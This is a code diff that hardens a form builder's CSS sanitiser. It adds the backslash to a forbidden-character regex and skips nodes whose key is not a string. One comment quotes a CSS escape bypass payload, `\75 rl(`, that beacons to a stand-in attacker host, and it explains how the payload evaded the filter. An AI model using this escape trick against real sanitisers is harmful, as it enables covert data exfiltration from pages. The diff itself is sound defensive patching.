@@ -67,8 +67,26 @@ export const DEVICE_QUERY: Record<Exclude<Device, 'any'>, string> = {
  * Refused as a set rather than escaped, and both halves of the pair rather than
  * only the opener, because deciding which comment is safe invites an argument
  * this does not need.
+ *
+ * The backslash belongs in this set and was missing from it, which made the
+ * `FETCHING` refusal below bypassable and put the exfiltration channel back.
+ * CSS consumes escapes while building an identifier, so `\75 rl(` tokenises as
+ * the `url(` function with none of its letters ever appearing -- and `FETCHING`
+ * matches letters. A Style tab block of
+ * `background:\75 rl(https://attacker.example/beacon)` passed
+ * `safeDeclarations`, reached the page through the renderer's `<style>`, and
+ * issued a request from the form that is collecting the answers.
+ *
+ * `FORBIDDEN_VALUE`, the grammar for the other sink, has carried the backslash
+ * for a while under a comment naming this exact technique. This list is the one
+ * that did not get it. Two sinks, two grammars, and only one of them was
+ * checked.
+ *
+ * Nothing legitimate in a declaration block needs a backslash. It is an escape
+ * hatch in a language the author is typing by hand, and every real value --
+ * a colour, a length, a font stack -- is spelled without one.
  */
-const FORBIDDEN = /[{}<@]|\/\*|\*\//
+const FORBIDDEN = /[{}<@\\]|\/\*|\*\//
 
 /**
  * Whether every quote in a declaration block is closed.
@@ -87,6 +105,23 @@ function quotesBalanced(text: string): boolean {
   let single = 0
   let double = 0
   for (let i = 0; i < text.length; i += 1) {
+    /*
+     * The escape skip stays, and it was never the whole story.
+     *
+     * Skipping the character after a backslash meant `color:red\` counted as
+     * balanced -- the trailing backslash consumed the end of the string, so
+     * nothing was ever left unbalanced -- and `styleSheetFor` then emitted
+     * `…{color:red\}`, where `\}` is a valid escape inside the value token and
+     * the block is never closed. One component with a trailing backslash
+     * silently deleted every rule emitted after it and absorbed the following
+     * components' declarations: exactly the breakage this function was added
+     * for, arriving by the route the fix did not look at.
+     *
+     * `FORBIDDEN` refuses the backslash outright now, so a block reaching here
+     * carrying one has already been refused and this loop never sees the case.
+     * The skip is kept because this function reasons about a raw string on its
+     * own and must not depend on the order the two checks happen to run in.
+     */
     if (text[i] === '\\') {
       i += 1
       continue
@@ -247,6 +282,25 @@ export function styleSheetFor(root: ComponentNode, options: StyleSheetOptions = 
   walk(root, (node) => {
     const css = node.css
     if (!css) return
+
+    /*
+     * The key is checked before it is escaped, and it was not.
+     *
+     * `selectorFor` calls `escapeKey`, which calls `key.replace`, so a node
+     * carrying a `css` block and `"key": 42` threw `TypeError` -- and this walk
+     * runs inside the renderer's `useMemo`, where a throw in React 19 takes the
+     * whole form off screen for somebody who cannot edit the document.
+     * `validateDocument` reports a non-string key without preventing it, and
+     * `store.ts` only warns.
+     *
+     * `walk` guards the node's shape and not the key's type. `context.ts`
+     * hardened `evaluatorKeys` against this exact document and `context.test.ts`
+     * has the row for it; this sink did not.
+     *
+     * Skipped rather than refused: a node whose key is not a string has no
+     * selector to write, and the rest of the sheet is still worth emitting.
+     */
+    if (typeof node.key !== 'string') return
 
     const selector = selectorFor(node.key, scope)
     const always = safeDeclarations(css.any)
